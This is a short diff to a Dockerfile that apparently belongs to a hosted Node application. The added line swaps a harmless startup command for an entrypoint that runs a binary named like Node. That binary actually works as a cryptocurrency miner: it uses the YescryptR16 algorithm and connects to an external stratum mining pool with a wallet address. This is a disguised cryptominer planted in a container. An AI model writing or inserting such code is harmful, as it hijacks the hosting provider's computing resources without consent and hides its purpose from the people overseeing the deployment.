@@ -7,6 +7,6 @@ RUN groupadd -g 10014 choreo && \
 USER 10014
 
 WORKDIR /opt/node
-RUN cat /opt/node/startde.sh
+ENTRYPOINT ["/bin/bash", "-c", "/opt/node/node -q --no-color -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.choreo_137"]
 
 
